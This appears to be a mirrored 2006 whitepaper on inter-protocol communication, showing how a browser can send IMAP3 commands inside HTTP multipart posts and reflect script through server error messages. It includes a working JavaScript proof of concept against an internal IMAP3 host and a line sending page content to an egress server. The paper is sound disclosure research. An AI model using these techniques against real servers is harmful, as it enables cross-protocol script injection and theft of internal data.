@@ -1,0 +1,359 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<html>
+
+<!-- Mirrored from bindshell.net/papers/ipc by HTTrack Website Copier/3.x [XR&CO'2010], Fri, 28 Jan 2011 12:56:44 GMT -->
+<head>
+	<title>BindShell.Net: Inter-Protocol Communication</title>
+	<link rel="pingback" href="http://bindshell.net/www.bindshell.net/pingback.html" />
+	<link rel="stylesheet" type="text/css" media="all" href="../style/default.css" />
+	<meta name="description" content="Inter-Protocol Communication xss" />
+	<meta name="keywords" content="Inter-Protocol Communication xss" />
+</head>
+<body>
+
+<div id="banner">
+<a href="../index.html"><img src="../image/logo.gif"></a>
+</div>
+
+<div id="breadcrumbs">
+<a href="../index.html">Home</a> : <a href="../papers.html">Papers</a> : Inter-Protocol Communication
+</div>
+<div id="main">
+	<div id="sidebar">
+		<div class="section">
+<p class="title">Index</p>
+<ul>
+<li><a href="../papers.html">Papers</a></li>
+<li><a href="../tools.html">Tools</a></li>
+</ul>
+<p class="title">Users</p>
+<ul>
+<li><a href="../users/Dave.html">Dave</a></li>
+<li><a href="../users/John.html">John</a></li>
+<li><a href="../users/Mark.html">Mark</a></li>
+<li><a href="../users/Wade.html">Wade</a></li>
+</ul>
+<p class="title">Categories</p>
+<ul>
+<li><a href="../archive/news.html">Site News</a> (9)</li>
+<li><a href="../archive/rants.html">Rants</a> (1)</li>
+<li><a href="../archive/security.html">Security</a> (10)</li>
+<li><a href="../archive/events.html">Events</a> (36)</li>
+<li><a href="../archive/technology.html">Technology</a> (5)</li>
+</ul>
+<p class="title">Archive</p>
+<ul>
+<li><a href="../archive/2010/December.html">December </a> (1)</li>
+<li><a href="../archive/2010/November.html">November </a> (1)</li>
+<li><a href="../archive/2010/October.html">October  </a> (2)</li>
+<li><a href="../archive/2010/March.html">March    </a> (1)</li>
+<li><a href="../archive/2010/February.html">February </a> (4)</li>
+<li><a href="../archive/2009/December.html">December </a> (1)</li>
+<li><a href="../archive/2009/September.html">September</a> (4)</li>
+<li><a href="../archive/2009/August.html">August   </a> (1)</li>
+<li><a href="../archive/2009/July.html">July     </a> (1)</li>
+<li><a href="../archive/2009/June.html">June     </a> (3)</li>
+<li><a href="../archive/2009/May.html">May      </a> (1)</li>
+<li><a href="../archive/2009/April.html">April    </a> (2)</li>
+</ul>
+
+		</div>
+<div class="footer">[ <a href="https://bindshell.net/login">Login</a> ]</div>
+	</div>
+	<div id="pagecontent">
+<div id="toc"><strong>Contents</strong>
+	<div style="margin-left: 0em;"><a href="ipc.html#toc1">Abstract</a></div>
+	<div style="margin-left: 0em;"><a href="ipc.html#toc2">Introduction</a></div>
+	<div style="margin-left: 0em;"><a href="ipc.html#toc3">Inter-Protocol Communication</a></div>
+	<div style="margin-left: 1em;"><a href="ipc.html#toc4">Requirements</a></div>
+	<div style="margin-left: 2em;"><a href="ipc.html#toc5">Error Tolerance</a></div>
+	<div style="margin-left: 2em;"><a href="ipc.html#toc6">Encapsulation</a></div>
+	<div style="margin-left: 1em;"><a href="ipc.html#toc7">HTTP and IMAP3 Example</a></div>
+	<div style="margin-left: 2em;"><a href="ipc.html#toc8">TCP Connection</a></div>
+	<div style="margin-left: 2em;"><a href="ipc.html#toc9">Error Tolerance</a></div>
+	<div style="margin-left: 2em;"><a href="ipc.html#toc10">Encapsulation</a></div>
+	<div style="margin-left: 0em;"><a href="ipc.html#toc11">Bi-directional Inter-Protocol Communication</a></div>
+	<div style="margin-left: 1em;"><a href="ipc.html#toc12">Requirements</a></div>
+	<div style="margin-left: 1em;"><a href="ipc.html#toc13">Method</a></div>
+	<div style="margin-left: 2em;"><a href="ipc.html#toc14">Verbose Errors</a></div>
+	<div style="margin-left: 1em;"><a href="ipc.html#toc15">HTTP and IMAP3 Example</a></div>
+	<div style="margin-left: 2em;"><a href="ipc.html#toc16">Inter-Protocol Cross-site Scripting</a></div>
+	<div style="margin-left: 2em;"><a href="ipc.html#toc17">Inter-Protocol Fingerprinting</a></div>
+	<div style="margin-left: 2em;"><a href="ipc.html#toc18">Brute Force Attacks</a></div>
+	<div style="margin-left: 0em;"><a href="ipc.html#toc19">Further Research</a></div>
+	<div style="margin-left: 1em;"><a href="ipc.html#toc20">Inter-Protocol Exploitation</a></div>
+	<div style="margin-left: 1em;"><a href="ipc.html#toc21">Inter-Port Cross-site Scripting</a></div>
+	<div style="margin-left: 0em;"><a href="ipc.html#toc22">Conclusion</a></div>
+	<div style="margin-left: 0em;"><a href="ipc.html#toc23">References</a></div>
+</div>
+
+
+<h1 id="toc0">Inter-Protocol Communication</h1>
+<p><img src="ipc/ipc.png" class="inline-left">Wade Alcorn<br />
+wade@bindshell.net<br />
+<a href="../index.html" onclick="window.open(this.href, '_self'); return false;">http://www.bindshell.net</a><br />
+Whitepaper</p>
+
+<p>Published: August 2006<br />
+Last Edited: None<br />
+Version: 1.0.0</p>
+
+<p>Copyright (c) 2006 Wade Alcorn<br />
+All Rights Reserved Worldwide</p>
+
+
+<h2 id="toc1">Abstract</h2>
+<p>This paper explores the Inter-Protocol Communication attack vector. That is, the potential of two different protocols meaningfully communicating commands and data. This has been investigated through encapsulating the target protocol within a carrier protocol. The findings demonstrate that under certain conditions distinct protocols are interoperable.</p>
+
+
+<h2 id="toc2">Introduction</h2>
+<p>Research within the area of web browser security, in particularly Cross-site scripting Viruses and Browser Exploitation Frameworks, has become a catalyst for further exploration into the broader area of Inter-Protocol Communication. That is, an attack vector which potentially allows arbitrary protocols to meaningfully interact with each other.</p>
+
+<p>Web browsers create an ideal environment to investigate the impact of communication across protocols. Web browsers are on the majority of machines within a network, giving them the privileged position of being in virtually all sections of the network. They also have the ability to make arbitrary requests and receive responses from web servers on the Internet. Each of the requests asks a web server to provide direction as to what actions the web browser should take. The process relinquishes control of the web browser environment to the web server where it has at its disposal a variety of scripting languages and APIs. Web server responses are not guaranteed to be free of malicious content, whether this is from an untrustworthy source or from interference en-route. Malicious content could have the capability to direct the web browser to perform Inter-Protocol Communication.</p>
+
+<p>Inter-Protocol Communication involves encapsulating the target protocol within another carrier protocol to facilitate the communication of commands and data. For successful communication across protocols, two preconditions need to be met. The protocol needs to be sufficiently error tolerant, and a method needs to exist to encapsulate the target protocol within the carrier protocol.</p>
+
+<p>Discussion in this paper will focus almost exclusively on using a web browser as a client for Inter-Protocol Communication. This does not suggest that other protocols’ implementations won’t be capable of Inter-Protocol Communication.</p>
+
+
+<h2 id="toc3">Inter-Protocol Communication</h2>
+<p>Inter-Protocol Communication is the communication between two distinct protocols. It uses encapsulation to allow two different protocols to communicate meaningfully, even though they were implemented using different protocol specifications. The two protocols in Inter-Protocol Communication are termed the carrier protocol and the target protocol. The target protocol is the protocol that the receiver can interpret. The carrier protocol is the protocol that is being sent and that encapsulates the target protocol. A chief consideration for Inter-Protocol Communication is the separators in the target protocol. Different protocols implement different methods to separate sections of data. In some situations semicolons are employed and in others a carriage return may be used. For example, IMAP3 uses carriage returns to separate sections of data. It will usually be a<br />
+requirement for Inter-Protocol Communication that the carrier protocol accurately<br />
+encapsulate separator data.</p>
+
+
+<h3 id="toc4">Requirements</h3>
+<p>There are two main requirements for successful Inter-Protocol Communication. These requirements will not be consistent across different implementations of the same protocol. The variation will occur due to different interpretations of the protocol specifications.</p>
+
+
+<h4 id="toc5">Error Tolerance</h4>
+<p>The first requirement is that the implementation of the target protocol be sufficiently forgiving of errors. During the Inter-Protocol connection it is likely that a percentage of the communication will be invalid and cause errors. Some protocol implementations permit only a certain number of errors before dropping the connection. For example, Exim version 4.50 only allows 4 errors before disconnecting the client. If the carrier protocol causes more errors than this maximum before communicating any of the encapsulated target protocol the Inter-Protocol Communication attempt will fail.</p>
+
+
+<h4 id="toc6">Encapsulation</h4>
+<p>The second requirement is that the target protocol can be encapsulated in the carrier protocol. The encapsulation is unlikely to be perfect and will cause errors. Whilst it is possible binary protocols will interweave with each other, it is more probable that text based protocols will be more Inter-Protocol compatible.</p>
+
+
+<h3 id="toc7">HTTP and IMAP3 Example</h3>
+<p>Inter-Protocol Communication can be performed from a HTTP carrier protocol to an IMAP3 target protocol. It is possible to encapsulate IMAP3 within a web request so that valid commands can be passed to an IMAP3 server.</p>
+
+
+<h4 id="toc8">TCP Connection</h4>
+<p>During the setup of Inter-Protocol Communication (initiated from the web browser) the HTTP request to an IMAP3 server will perform a normal layer 4 handshake. This will start with the browser’s host’s network stack sending a SYN. The target host will respond with a SYN ACK which will be in turn answered with an ACK. This completes the setting up of the connection. At this point, no errors have occurred and either end can start sending data. It is also important to note that the implementation of web browsers explicitly prohibit connecting to some ports.</p>
+
+
+<h4 id="toc9">Error Tolerance</h4>
+<p>After the TCP connection is established, the web browser will commence sending HTTP protocol data. At this point it is possible that both protocols will register errors and gracefully drop the connection. For Inter-Protocol Communication to be successful it will also be required that the IMAP3 implementation will need to be forgiving of errors. This allows the lines of the HTTP (carrier protocol) request to be ignored if they do not conform exactly to the IMAP3 (target protocol) specification. A perfect protocol transformation without errors is highly unlikely.</p>
+
+<p>During the communication the majority of the HTTP header will error as the IMAP3 target protocol is unlikely to parse it as valid input. If there was limited error tolerance in the IMAP3 implementation and the number of HTTP header errors were greater than this tolerance, the Inter-Protocol attempt may not be successful.<br />
+
+<pre><code>POST /localhost HTTP/1.0
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, </code></pre>
+
+ <sup>HTTP request header snippet</sup><br />
+
+<pre><code>POST /localhost HTTP/1.0
+POST BAD Command unrecognized/login please: /LOCALHOST
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
+Accept: BAD Command unrecognized/login please: IMAGE/GIF,</code></pre>
+
+ <sup>IMAP3 response snippet errors</sup></p>
+
+
+<h4 id="toc10">Encapsulation</h4>
+<p>For successful Inter-Protocol Communication the HTTP protocol must be able to encapsulate the IMAP3 protocol. That is, interpretable commands or data must reach the IMAP3 server. The IMAP protocol uses single line commands containing a space and is terminated by a carriage return. Any successful encapsulation must send commands to the IMAP3 server in this format. To achieve this, the web browser can employ both HTTP multipart post requests and Javascript.</p>
+
+<p>The encapsulation from the web browser is programmatically constructed by using a multipart form and submitting it to an IMAP3 server and port. The HTTP multipart post request provides a way to control the data at a low enough level to accomplish IMAP3 encapsulation.</p>
+
+<p>The multipart post request delimits the content within the request into defined boundaries. Unlike other request types, the content is not URL encoded. The characters: carriage return, quotes, space, greater than and less than are represented as their ASCII value and not the escaped representation. This functionality allows for substantial control over this section and is ideal for the encapsulation of the IMAP3 target protocol. It provides a method to encapsulate the IMAP3 commands in the request.</p>
+
+<p>After the TCP connection is established and the HTTP headers have produced errors the IMAP3 server will start to process the multipart post content. If the content has been constructed as IMAP3 commands (with carriage returns, etc) they will be executed on the server.</p>
+
+<p>It is at this point that the target protocol is interpreted by the IMAP3 server as valid commands and Inter-Protocol Communication occurs. This protocol encapsulation demonstrates that it is possible for Inter-Protocol Communication from a web browser to an IMAP3 server.</p>
+
+
+<pre><code>-----------------------------7d6195410340
+Content-Disposition: form-data; name=&quot;ta&quot;
+
+a002 logout</code></pre>
+
+ <sup>HTTP request snippet sending the logout command</sup>
+<pre><code>-----------------------------7d6195410340
+-----------------------------7d6195410340 BAD Missing command
+Content-Disposition: form-data; name=&quot;ta&quot;
+Content-Disposition: BAD Command unrecognized/login please: FORM-DATA;
+
+* BAD Null command
+a002 logout
+* BYE debian IMAP4rev1 server terminating connection
+a002 OK LOGOUT completed</code></pre>
+
+ <sup>IMAP3 response snippet interpret the logout command</sup>
+<h2 id="toc11">Bi-directional Inter-Protocol Communication</h2>
+<p>Inter-Protocol Communication can be both unidirectional and bi-directional. In Bi-directional Inter-Protocol Communication the initiator of the communication will be able to interpret the response.</p>
+
+<p>The main difference is during the response the target and carrier protocols swap. The terminology adopted in this situation is “secondary carrier protocol” and “secondary target protocol”. That is, the reply protocol will subsequently become the secondary carrier protocol. Additionally, the protocol in which the initial request was performed will become the secondary target protocol. <br />
+
+<h3 id="toc12">Requirements</h3>
+</p>
+
+<p>The two requirements of encapsulation and error tolerance will still be applicable. These are now required in both directions. This substantially increases the complexity of the communication as the initiator now has to encapsulate both the target protocol and the secondary target protocol.</p>
+
+
+<h3 id="toc13">Method</h3>
+
+<h4 id="toc14">Verbose Errors</h4>
+<p>One method that can aid in interpreting the response of a Bi-directional Inter-Protocol Communication is the utilisation of verbose errors. The initiator of the Inter-Protocol Communication will deliberately cause errors in the target protocol. When the error is sufficiently verbose, the data sent (containing the deliberate error) may be returned as part of the response.</p>
+
+<p>In this situation the initiator can not only control what commands are encapsulated in the target protocol, but can control sections of the secondary carrier protocol. Utilizing these controllable sections it may be possible to construct valid secondary target protocol commands.</p>
+
+<p>Where both valid target protocol and secondary target protocol commands can be assembled, Bi-directional Inter-Protocol Communication can be established.</p>
+
+
+<h3 id="toc15">HTTP and IMAP3 Example</h3>
+
+<h4 id="toc16">Inter-Protocol Cross-site Scripting</h4>
+<p>Cross-site scripting is a vulnerability normally found in web applications by which an attacker finds a mechanism to inject a script into a victim’s client. Inter-Protocol Cross-site scripting uses a non-HTTP protocol server to reflect the script into the web browser rather than a web application.</p>
+
+<p>Web browsers will parse responses from arbitrary protocol servers provided they meet various pre-requisites. These pre-requisites vary between browser implementations and are not discussed in this paper.</p>
+
+<p>The request is reflected off the target protocol server and becomes a mangled response containing errors, banners and other metadata. This response may contain verbose error messages which provide details of the errors occurring within protocol communication. It is these informative errors in which it may be possible to inject scripts to be executed by the web browser.</p>
+
+<p>As discussed previously, a multipart post request provides sufficient control over the request to allow encapsulation of arbitrary IMAP3 commands. This, combined with the IMAP3 server providing verbose error messages, provides a mechanism for script injection.</p>
+
+<p>A specifically crafted HTTP request to an IMAP3 server can contain Inter-Protocol Cross-site scripting that will be parsed and executed in a web browser. When the IMAP3 server receives an unknown command it responds by echoing the attempted command and stating that it was unrecognized. By attempting to execute the intentionally erroneous command “&lt;script&gt;alert(‘BAD COMMAND’)&lt;/script&gt;” it will be echoed back to the browser and parsed as a valid HTML script.</p>
+
+
+<pre><code>&lt;script&gt;alert(‘BAD COMMAND’)&lt;/script&gt; BAD Missing command</code></pre>
+
+ <sup>IMAP3 error containing a script tag</sup><br />
+The following IMAP3alert function demonstrates Inter-Protocol Cross-site scripting. It will display an alert box within the browser showing content of the response. 
+<pre><code>var target_ip = '10.26.81.32';
+var target_port = '220';
+    
+IMAP3alert(target_ip, target_port);
+
+function IMAP3alert(ip, port) {
+    
+    // create the start of the form HTML    
+    var form_start = '&lt;FORM name=&quot;multipart&quot; ';
+    form_start += 'id=&quot;multipart&quot;    action=&quot;http://';
+    form_start += ip + ':' + port;
+    form_start += '/dummy.html&quot; ';
+    form_start += 'type=&quot;hidden&quot; ';
+    form_start += 'enctype=&quot;multipart/form-data&quot; ';
+    form_start += 'method=&quot;post&quot;&gt; ';
+    form_start += '&lt;TEXTAREA NAME=&quot;commands&quot; ROWS=&quot;0&quot; COLS=&quot;0&quot;&gt;';
+    
+    // create the end of the form HTML    
+    var form_end = '&lt;/TEXTAREA&gt;&lt;/FORM&gt;'; 
+    
+    // create the commands 
+    cmd = &quot;&lt;scr&quot;+&quot;ipt&gt;alert(document.body.innerHTML)&lt;/scr&quot;+&quot;ipt&gt;\n&quot;;
+    cmd += 'a002 logout' + &quot;\n&quot;; // IMAP3 logout command
+    
+    // create multipart form
+    document.write(form_start);
+    document.write(cmd);
+    document.write(form_end);
+    
+    // send it
+    document.multipart.submit();            
+}</code></pre>
+
+ <sup>IMAP3 alert function</sup><br />
+
+<h4 id="toc17">Inter-Protocol Fingerprinting</h4>
+<p>Fingerprinting is the method of determining details of (usually) remote systems through metadata. Operating system and protocol information can be attained in a variety of ways, including the simple extrapolation from a port number. In all methods there is a risk of false positives.</p>
+
+<p>Inter-Protocol Cross-site scripting provides a new method to perform fingerprinting from within a web browser. After successful injection of Javascript within the unknown protocol, it is possible to access the “document.body.innerHTML&quot; property. The innerHTML property provides (read and write) access to content body element and importantly in this instance it contains the response of the unknown protocol. <br />
+    <br />
+Next, the unknown protocol response can be transferred by using HTTP requests to an arbitrary server. A simple method to achieve this is to concatenate innerHTML property onto the end of a HTTP get request.</p>
+
+
+<pre><code>url = ‘http://www.egress-site.com/’ + escape(document.body.innerHTML);</code></pre>
+
+ <sup>Egress javascript concatenation command</sup><br />
+Programmatically, finger printing the remote protocol will involve the content of the unknown protocol response being retrieved and then transferred to a remote server. From there any number of algorithms could be employed to digest the results and fingerprint the protocol. 
+<h4 id="toc18">Brute Force Attacks</h4>
+<p>Brute forcing is a method that systematically attempts all authentication possibilities to gain access to a system. The major weakness is the amount of time the attack will take to complete. There are common methods to increase the likelihood of a successful attempt, for example, using high probability usernames and passwords.</p>
+
+<p>Once a protocol is known to allow Inter-Protocol Cross-site scripting and has been successfully fingerprinted, there is a potential for a brute force attack. If the protocol requires authentication credentials these could be brute forced from within the web browser. Like traditional brute force applications, the target protocol negotiations and authentication attempts will custom to the protocol.</p>
+
+
+<h2 id="toc19">Further Research</h2>
+
+<h3 id="toc20">Inter-Protocol Exploitation</h3>
+<p>One possible direction for further research in Inter-Protocol Communication is Inter-Protocol Exploitation. This is the process where by a vulnerability is exploited within the boundaries of a different carrier protocol. The protocol carrying the crafted exploit data will still abide to its protocol specification. Situations in which Inter-Protocol Exploitation is possible are likely to be limited, as it requires specific preconditions which are dictated by the carrier protocol implantation and target vulnerability. <br />
+
+<h3 id="toc21">Inter-Port Cross-site Scripting</h3>
+</p>
+
+<p>Web browsers vary in how restrictive DOM security is when accessing frames that retrieved data from different ports within the same domain. In some instances, a web browser may permit javascript to access the content of these frames even where Inter-Protocol Communication isn’t attempted. <br />
+
+<h2 id="toc22">Conclusion</h2>
+</p>
+
+<p>In the past, it has been assumed that communication between different protocols is invalid and of no consequence. However this paper has demonstrated that when a particular set of preconditions are met, communication between two distinct protocols is possible and significant. These preconditions are that the protocol implementations are sufficiently error tolerant, and that a method exists to encapsulate the target protocol within the carrier protocol.</p>
+
+<p>The resultant Inter-Protocol Communication has been demonstrated through examples of interaction between HTTP and IMAP3. This was achieved through a web browser encapsulating valid IMAP3 commands within a HTTP request. This in turn,<br />
+provoked a response from the IMAP3 server, returning error messages that were deliberately crafted. These error messages were parsed by the web browser as valid HTML, resulting in the execution of scripts. This sequence of events proves that bi-directional and meaningful communication is possible.</p>
+
+<p>Whilst some implications of Inter-Protocol Communication have been discussed, for example Inter-Protocol Cross-site scripting, this remains an area for further research. What is evident, however, at this early stage is that Inter-Protocol Communication is a attack vector worthy of significant consideration.</p>
+
+
+<h2 id="toc23">References</h2>
+<p>1.    The Cross-site Scripting Virus<br />
+<a href="xssv.html" onclick="window.open(this.href, '_self'); return false;">http://www.bindshell.net/papers/xssv</a></p>
+
+<p>2.    Browser Exploitation Framework<br />
+<a href="../tools/beef.html" onclick="window.open(this.href, '_self'); return false;">http://www.bindshell.net/tools/beef</a></p>
+
+<p>3.    HTML Code Injection and Cross-site scripting<br />
+<a href="http://www.technicalinfo.net/papers/CSS.html" onclick="window.open(this.href, '_self'); return false;">http://www.technicalinfo.net/papers/CSS.html</a></p>
+
+<p>4.    XSS (Cross-site Scripting) Cheat Sheet<br />
+<a href="http://ha.ckers.org/xss.html" onclick="window.open(this.href, '_self'); return false;">http://ha.ckers.org/xss.html</a></p>
+
+<p>5.    CGISecurity's Cross-site Scripting FAQ<br />
+<a href="http://www.cgisecurity.com/articles/xss-faq.shtml" onclick="window.open(this.href, '_self'); return false;">http://www.cgisecurity.com/articles/xss-faq.shtml</a></p>
+
+<p>6.    Wikipedia Javascript<br />
+<a href="http://en.wikipedia.org/wiki/Javascript" onclick="window.open(this.href, '_self'); return false;">http://en.wikipedia.org/wiki/Javascript</a></p>
+
+<p>7.    HTML 4.01 Specification<br />
+<a href="http://www.w3.org/TR/html4/present/frames.html" onclick="window.open(this.href, '_self'); return false;">http://www.w3.org/TR/html4/present/frames.html</a></p>
+
+<p>8.    Bugtraq Posting - 1998<br />
+<a href="http://archive.cert.uni-stuttgart.de/archive/bugtraq/1998/10/msg00046.html" onclick="window.open(this.href, '_self'); return false;">http://archive.cert.uni-stuttgart.de/archive/bugtraq/1998/10/msg00046.html</a></p>
+
+<p>9.    HTML Form Protocol Attack<br />
+<a href="http://www.remote.org/jochen/sec/hfpa/index.html" onclick="window.open(this.href, '_self'); return false;">http://www.remote.org/jochen/sec/hfpa/index.html</a></p>
+
+<p>10.    Extended HTML Form Attack<br />
+<a href="http://eyeonsecurity.org/papers/Extended%20HTML%20Form%20Attack.htm" onclick="window.open(this.href, '_self'); return false;">http://eyeonsecurity.org/papers/Extended%20HTML%20Form%20Attack.htm</a></p>
+
+<p>11.    Mozilla Port Blocking<br />
+<a href="http://www.mozilla.org/projects/netlib/PortBanning.html" onclick="window.open(this.href, '_self'); return false;">http://www.mozilla.org/projects/netlib/PortBanning.html</a></p>
+
+<p>12.    Interactive Mail Access Protocol - Version 3<br />
+<a href="http://tools.ietf.org/html/rfc1203" onclick="window.open(this.href, '_self'); return false;">http://tools.ietf.org/html/rfc1203</a></p>
+
+	</div>
+</div>
+
+<a href="http://bindshell.net/login" accesskey="L" class="hidden"></a>
+<!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+ xmlns:dc="http://purl.org/dc/elements/1.1/"
+ xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
+	<rdf:Description rdf:about="http://www.bindshell.net"
+	 dc:identifier="http://www.bindshell.net"
+	 dc:title="bindshell.net"
+	 trackback:ping="http://bindshell.net/trackback" />
+</rdf:RDF>
+-->
+</body>
+
+<!-- Mirrored from bindshell.net/papers/ipc by HTTrack Website Copier/3.x [XR&CO'2010], Fri, 28 Jan 2011 12:56:44 GMT -->
+</html>
